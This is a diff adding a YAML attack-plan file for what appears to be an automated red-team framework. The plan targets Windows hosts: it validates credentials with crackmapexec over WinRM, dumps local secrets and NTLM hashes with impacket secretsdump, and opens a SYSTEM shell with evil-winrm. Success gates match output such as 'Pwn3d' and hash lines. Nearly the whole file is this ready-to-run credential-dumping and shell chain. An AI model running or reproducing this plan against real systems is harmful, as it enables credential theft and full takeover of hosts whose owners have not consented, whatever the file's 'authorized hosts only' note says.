@@ -1,0 +1,61 @@
+# Mech-Unit attack intent — Windows credential dump + SYSTEM shell.
+# Packages crackmapexec + secretsdump + evil-winrm from the AD/postex
+# tool chain. Requires valid credentials (captured elsewhere in the graph).
+id: host_privesc_windows
+name: Windows SYSTEM Access
+category: host
+operator_label: "Get SYSTEM on a Windows host"
+operator_description: >
+  Validates credentials against the Windows host, dumps local secrets with
+  secretsdump, and opens a WinRM shell as SYSTEM when the account is local
+  admin. The standard credential-cashing move on Windows.
+outcome: "SYSTEM-level access and dumped secrets, or auth failure"
+grants: [host.system, host.secrets]
+time_to_impact: minutes
+noise: low
+risk_notes: >
+  Generates Windows logon events (4624/4625) and WinRM traffic.
+  Authorized hosts only.
+
+preconditions:
+  - probe: tools_present
+    with: [crackmapexec, evil-winrm]
+
+plan:
+  - step: check_access
+    tool: crackmapexec_exec
+    args:
+      target: "{{ target.host }}"
+      username: "{{ target.username }}"
+      password: "{{ target.password }}"
+      protocol: winrm
+    max_wait: 120
+    gate:
+      output: "Pwn3d|SUCCESS"
+    on_fail: warn
+
+  - step: dump_secrets
+    tool: impacket_tools
+    args:
+      tool: secretsdump
+      target: "{{ target.host }}"
+    max_wait: 600
+    gate:
+      output: "Dumping|NTLM|:::"
+    on_fail: warn
+
+  - step: shell
+    tool: evil_winrm
+    args:
+      target: "{{ target.host }}"
+      username: "{{ target.username }}"
+      password: "{{ target.password }}"
+    max_wait: 300
+    gate:
+      output: "PS C:|Windows PowerShell"
+    on_fail: warn
+
+artifacts:
+  secrets_log: "{{ plan_dir }}/secretsdump.log"
+
+llm_required: false
